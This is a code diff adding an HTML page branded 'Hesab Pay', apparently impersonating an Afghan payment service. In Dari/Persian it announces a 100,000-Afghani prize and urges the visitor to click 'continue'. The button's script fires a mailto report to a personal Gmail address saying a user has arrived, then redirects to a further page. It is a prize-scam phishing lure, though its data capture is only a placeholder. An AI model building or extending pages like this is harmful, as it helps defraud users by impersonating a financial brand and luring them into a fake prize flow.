@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hesab Pay</title>
+    <link rel="stylesheet" href="hesabPay.css">
+</head>
+<body>
+
+    <h2 style="color: green;">شما برنده ۱۰۰٬۰۰۰ افغانی شده اید</h2>
+    <img src="../../image/giftMoney.png" alt="" width="200px" height="auto">
+    <p>برای ادامه روی دکمه کلیک کنید</p>
+    <button onclick="conTinue()"> ادامه </button>
+
+    <script>
+
+        function conTinue(){
+            let user="user logined in on site";
+            window.location.href='mailto:alfannanmaher@gmail.com?subject پیام جدید&body=' + user;
+            
+            window.location.href='page3.html';
+        }
+
+    </script>
+    
+</body>
+</html>
